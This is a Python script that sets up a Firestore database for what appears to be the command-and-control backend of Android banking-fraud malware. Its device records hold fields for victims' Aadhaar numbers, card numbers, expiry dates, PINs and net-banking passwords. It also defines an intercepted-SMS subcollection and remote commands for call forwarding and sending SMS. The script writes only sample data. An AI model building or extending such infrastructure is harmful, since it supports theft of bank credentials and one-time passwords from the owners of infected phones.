#!/usr/bin/env python3
"""
Setup Firestore database structure
Creates collections and sample documents
"""

import firebase_admin
from firebase_admin import credentials, firestore
from datetime import datetime
import sys
import os

def main():
    # Path to service account key
    service_account_path = "../rtnew-d8023-firebase-adminsdk-fbsvc-71d8f9b05f.json"
    
    if not os.path.exists(service_account_path):
        print(f"❌ Service account file not found: {service_account_path}")
        sys.exit(1)
    
    try:
        # Initialize Firebase Admin
        if not firebase_admin._apps:
            cred = credentials.Certificate(service_account_path)
            firebase_admin.initialize_app(cred)
        
        db = firestore.client()
        
        print("🔥 Connected to Firestore!")
        print("🏗️  Setting up database structure...\n")
        
        # ==========================================
        # 1. Create 'devices' collection structure
        # ==========================================
        print("📱 Creating 'devices' collection...")
        
        # Sample device document
        sample_device = {
            "id": 0,
            "mobilename": "Sample Device",
            "deviceid": "sample_device_001",
            "charge": "100%",
            "lastOnline": firestore.SERVER_TIMESTAMP,
            "callForwardStatus": False,
            "userInfo": {
                "name": None,
                "number": None,
                "aadhar": None,
                "cardNumber": None,
                "cardExpiry": None,
                "cardPin": None,
                "netBankingUsername": None,
                "netBankingPassword": None
            },
            "simModel": {
                "sim1": "",
                "sim2": ""
            },
            "forwarding": {
                "fromSim": "",
                "toNumber": "",
                "status": "",
                "executed": False
            },
            "send_sms": {
                "phoneNumber": "",
                "message": "",
                "sent": False,
                "simSlot": 0,
                "timestamp": firestore.SERVER_TIMESTAMP
            }
        }
        
        # Create sample device
        device_ref = db.collection("devices").document("sample_device_001")
        device_ref.set(sample_device)
        print("  ✅ Created sample device: sample_device_001")
        
        # Create sample SMS subcollection
        sample_sms = {
            "from": "+1234567890",
            "message": "Sample SMS message",
            "time": firestore.SERVER_TIMESTAMP,
            "ownerDeviceId": "sample_device_001"
        }
        
        device_ref.collection("sms").add(sample_sms)
        print("  ✅ Created sample SMS in subcollection")
        
        # ==========================================
        # 2. Create 'smsforward' collection
        # ==========================================
        print("\n📨 Creating 'smsforward' collection...")
        
        sample_forward = {
            "number": "+1234567890",
            "enabled": False
        }
        
        db.collection("smsforward").document("sample_forward").set(sample_forward)
        print("  ✅ Created sample forwarding rule")
        
        # ==========================================
        # 3. Create 'logs' collection (optional)
        # ==========================================
        print("\n📋 Creating 'logs' collection...")
        
        sample_log = {
            "timestamp": firestore.SERVER_TIMESTAMP,
            "deviceId": "sample_device_001",
            "action": "device_registered",
            "details": "Sample device registered successfully"
        }
        
        db.collection("logs").add(sample_log)
        print("  ✅ Created sample log entry")
        
        # ==========================================
        # Summary
        # ==========================================
        print("\n" + "="*50)
        print("✅ Firestore structure created successfully!")
        print("="*50)
        print("\n📊 Collections created:")
        print("  1. devices/")
        print("     └── {deviceId}/")
        print("         ├── Device info (mobilename, charge, etc.)")
        print("         ├── userInfo (name, number, cards, etc.)")
        print("         ├── simModel (sim1, sim2)")
        print("         ├── forwarding (call forwarding settings)")
        print("         ├── send_sms (SMS to send)")
        print("         └── sms/ (subcollection)")
        print("             └── {smsId} (from, message, time)")
        print("\n  2. smsforward/")
        print("     └── {forwardId}/")
        print("         ├── number")
        print("         └── enabled")
        print("\n  3. logs/")
        print("     └── {logId}/")
        print("         ├── timestamp")
        print("         ├── deviceId")
        print("         ├── action")
        print("         └── details")
        
        print("\n💡 Tips:")
        print("  - Sample documents created for reference")
        print("  - Delete sample documents when ready to use")
        print("  - Device IDs should be unique per device")
        print("  - SMS subcollection is created per device")
        
        print("\n🎉 Database is ready to use!")
        
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
